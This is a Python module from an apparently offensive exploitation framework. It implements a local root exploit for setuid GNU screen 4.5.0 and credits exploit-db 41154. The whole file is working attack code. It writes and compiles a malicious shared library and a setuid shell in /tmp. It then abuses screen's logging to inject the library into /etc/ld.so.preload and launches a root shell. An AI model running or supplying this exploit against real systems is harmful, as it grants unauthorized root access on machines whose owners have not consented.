from subprocess import Popen, PIPE
from os import system, popen
import subprocess
from time import sleep
from module import Module


class BoomerModule(Module):
    def __init__(self):
        info = {"Name": "Screen Root",
                "Author": "Josue Encinar",
                "Description": "setuid screen v 4.5.0 local root exploit",
                "Reference": "https://www.exploit-db.com/exploits/41154/",
                "Acknowledgements" : "Xiphos Research Ltd"
                }
        options = { }
        super(BoomerModule, self).__init__(options,info)
        self.deregister_operation("put")

    def check(self):
        try:
            response = Popen(["screen", "--version"], stdout=PIPE, stderr=PIPE).communicate()[0]
            if b"4.05." in response:
                self.print_ok("Vulnerable")
            else:
                self.print_error("No Vulnerable")
        except:
            self.print_error("No found screen")

    def run(self):
        self.task1()
        print("Trying to get Root Shell")
        sleep(3)
        self.task2()

    def task1(self):
        libhax = open("/tmp/libhax.c", "w")
        libhax.write('''
        #include <stdio.h>
        #include <sys/types.h>
        #include <unistd.h>
        __attribute__ ((__constructor__))
        void dropshell(void){
            chown("/tmp/shell", 0, 0);
            chmod("/tmp/shell", 04755);
            uid_t getuid(void){
                return 0;
            }
        }
        ''')
        libhax.close()

        shell = open("/tmp/shell.c", "w")
        shell.write('''
        #include <stdio.h>
        int main(void){
            unlink("/etc/ld.so.preload");
            execvp("/bin/sh", NULL, NULL);
        }
        ''')
        shell.close()

        junk = popen("""
        screen -D -m gcc -shared -ldl -o /tmp/libhax.so /tmp/libhax.c 2> /dev/null;
        screen -D -m gcc -o /tmp/shell /tmp/shell.c 2> /dev/null;
        rm -f /tmp/shell.c; rm -f /tmp/libhax.c
        """)

        print("[*] Creating /etc/ld.so.preload file")
        p = popen('''
        umask 0;
        screen -D -m -q -L /etc/ld.so.preload echo -ne  "/tmp/libhax.so";
        ''')

    def task2(self):
        system("screen -lsq 2>&1 >/dev/null")
        print("[*] Launching Root Shell")
        system("/tmp/shell")